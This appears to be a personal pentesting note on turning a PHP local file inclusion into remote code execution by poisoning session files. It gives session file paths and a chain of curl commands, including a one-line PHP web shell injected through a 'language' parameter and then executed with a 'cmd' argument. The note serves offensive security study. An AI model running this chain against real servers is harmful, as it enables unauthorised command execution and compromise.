---
Primary_category: "[[LFI]]"
title: "LFI TO RCE - PHP SESSION POISONING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LFI]]

#### *Theory*

This attack vector requires writing *PHP Code* in a field we control that gets logged into a log file on the *remote machine*

Then, that file is included in order to execute *PHP Code*

For this attack to work, the user who executes the *PHP or Apache* processes, should have *read privileges* over the logged files

The ***PHP Session Poisoning*** works by poisoning a parameter stored inside the *PHPSESSID* cookie

##### *System Path of PHPSESSID Details*

> ***Related PHP Directive → [session.save_path](https://www.php.net/manual/en/function.session-save-path.php)***

The details of *PHPSESSID* cookies are stored in *session files* on the back-end

###### *Windows*

```bash
C:\Windows\Temp\sess_<PHPSESSID_VALUE>
```

###### *Linux*

```bash
/var/lib/php/sessions/sess_<PHPSESSID_VALUE>
```

---

#### *Abuse*

##### *Extracting the PHPSESSID Value*

```bash
curl --silent --request GET --location --head '<URL>' |& grep -i -- 'PHPSESSID'
```

##### *Using LFI to examine the PHPSESSID File Content*

```bash
curl --silent --request GET --location 'http://domain.tld/home.php?file=/var/lib/php/sessions/sess<PHPSESSID_VALUE>'
```

##### *Poisoning Cookie's Data controlled by the User*

Next, check if any data in the *session file* is under your control i.e. if it can be modified by the user

- ***Example I***

When a user logs into a *Web Application*, the user's name appears as a field within the *session file* of the cookie

- ***Example II***

The *session file* may contain a `language` value which is controlled by a *GET* parameter `?language=<VALUE>`

##### *Writing PHP Code to the Session File through the controlled data*

Therefore, an attacker could register a user whose name contains *PHP Code* and point to the *session* file through the *LFI* . This *PHP Code* will be executed

The same applies for the case of the *URL Parameter*, if there is a *URL Parameter* whose value is stored in the *session file* related to the *user's cookie*, just poison this parameter by writing *PHP Code* as its value

```bash
curl --silent --location --request GET 'http[s]://domain.tld/index.php?language=<?php system($_GET["cmd"]);?>' # URL Encoded
```

##### *Including the Session File using the LFI - Executing Commands through the Injected PHP Code*

```bash
curl --silent --location --request GET 'https[s]://domain.tld/home.php?file=/var/lib/php/sessions/sess_<PHPSESSID_VALUE>&cmd=<COMMAND>'
```
